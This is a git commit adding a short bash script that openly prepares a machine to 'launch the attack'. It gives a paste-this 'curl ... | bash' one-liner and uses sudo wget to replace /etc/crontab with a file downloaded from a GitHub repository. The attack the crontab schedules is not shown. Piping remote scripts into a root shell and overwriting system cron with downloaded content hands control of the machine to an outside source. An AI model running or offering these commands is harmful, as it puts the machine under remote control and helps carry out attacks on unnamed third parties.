6e3e70543d3a146c4114edb432612c57e7306593
russskiykorablidinah <102823296+russskiykorablidinah@users.noreply.github.com>
2022-04-11 18:09:21 +0300

    Create system_prepare.sh

---
+++ system_prepare.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+
+##### Script downloading our crontab file to schedule the system
+##### To run it just paste the following command to your Terminal:
+# >>>>> curl -s https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/system_prepare.sh | bash <<<<<
+
+sudo wget -O /etc/crontab https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/crontab
+
+echo "Done preparing crontab file"
+
+echo "Rebooting the system and launching the attack"
